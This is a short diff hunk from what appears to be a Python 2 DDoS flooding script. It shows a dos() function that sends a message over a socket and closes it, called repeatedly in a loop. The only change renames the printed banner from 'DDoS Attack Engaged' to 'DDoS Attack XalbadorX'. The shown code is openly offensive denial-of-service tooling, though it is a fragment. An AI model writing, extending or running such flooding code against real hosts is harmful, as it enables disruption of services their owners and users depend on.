@@ -34,7 +34,7 @@ def dos():
         ddos.send( message );
     except socket.error, msg:
         print("|[Connection Failed]         |")
-    print ( "|[DDoS Attack Engaged]       |")
+    print ( "|[DDoS Attack XalbadorX]       |")
     ddos.close()
 for i in range(1, conn):
     dos()
